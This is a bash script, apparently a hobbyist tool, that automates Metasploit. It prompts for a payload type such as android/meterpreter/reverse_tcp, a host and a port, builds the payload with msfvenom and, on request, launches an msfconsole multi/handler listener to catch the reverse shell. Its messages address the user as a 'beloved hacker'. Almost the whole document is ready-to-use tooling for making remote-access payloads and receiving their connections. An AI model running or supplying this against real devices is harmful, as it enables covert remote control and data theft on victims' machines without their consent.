#!/bin/bash
clear
echo "---------------------------------------------------------------------------------------"
echo "------/\----|  |     |---|___    ___|----/ ___ \--------|       -----| ____|-----------"
echo "-----/  \---|  |     |-------|  |-------| |   | |-------| |\  /|-----| |__-------------"
echo "----/ __ \--|  |__|  |-------|  |-------| |___| |-------| | \/ |-----| |__|------------"
echo "---/_/   _\--\______/_-------|__|--------\_____/--------| |    |-----| |---------------"
echo "----------------------------Welcome To Automated Payload Generator---------------------"

echo "(^-^) So my beloved hacker which type of payload do you want to generate? format:(android/meterpreter/reverse_tcp)"
read payload_type 
#---------------------Name of the generated  payload ----------------
echo "Would you please tell us the name for the payload (☞ﾟヮﾟ)☞ format(payload_name.format):"
read payload_name
echo "╰(*°▽°*)╯  Specify the host (192.168.1.0):"
read host
echo "¯\_(ツ)_/¯ Which port should we use:"
read port
echo "(^-^) Please give us a sec we cook it for yah (●'◡'●)"
##################This is the command to get the payload for yah ;)
./spinner.sh msfvenom -p $payload_type  -o $payload_name lhost=$host lport=$port
echo "¯\_(ツ)_/¯ Should we set up a listener for you?(yes/no)"
read 
opt1="yes"
opt2="no"
if [$REPLY == $opt1]
then
 echo "༼ つ ◕_◕ ༽つ Setting the listener....."
 ./spinner.sh msfconsole -q -x "use multi/handler; set PAYLOAD $payload_type; set LHOST $host; set LPORT $port; exploit;"
elif [$REPLY == $opt2]
then
 echo "(^-^) Okay then "
fi
echo "(^-^) Your payload is in the current working directory (●'◡'●)"
echo "(☞ﾟヮﾟ)☞ $PWD/$payload_name"
echo "---------------------------We love you and By The Way Youre welcome (¬_¬ )--------------"

